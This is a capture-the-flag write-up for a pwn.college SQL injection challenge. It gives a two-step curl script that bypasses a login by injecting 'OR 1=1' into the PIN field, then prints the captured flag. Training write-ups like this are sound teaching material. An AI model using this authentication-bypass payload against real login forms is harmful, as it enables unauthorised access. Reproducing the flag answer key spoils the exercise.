# [SQLi 1](https://pwn.college/intro-to-cybersecurity/web-security/#challenges-header-11)

## Problem
This level, on the other hand, is SQL injectible, as it purposefully uses a slightly different way to make SQL queries. When you find the SQL query into which you can inject your input (hint: it is the only SQL query to substantially differ between this level and the previous level), look at what the query looks like right now, and what unintended conditions you might inject. The quintessential SQL injection adds a condition so that an application can succeed without knowing the password. How can you accomplish this?

## Steps

```bash
#!/bin/bash

# Step 1: Send a POST request and save the session cookie
curl -c cookies.txt -X POST -d "account-id=admin&pin=1 OR 1=1" http://challenge.localhost/identity

# Step 2: Send a GET request to retrieve the flag with the saved cookie
curl -b cookies.txt http://challenge.localhost/identity
```

## Solution

```
pwn.college{UFRzBMFPKIQxneZV6E09ysgLKaB.dNzN1YDL3MTM3QzW}
```
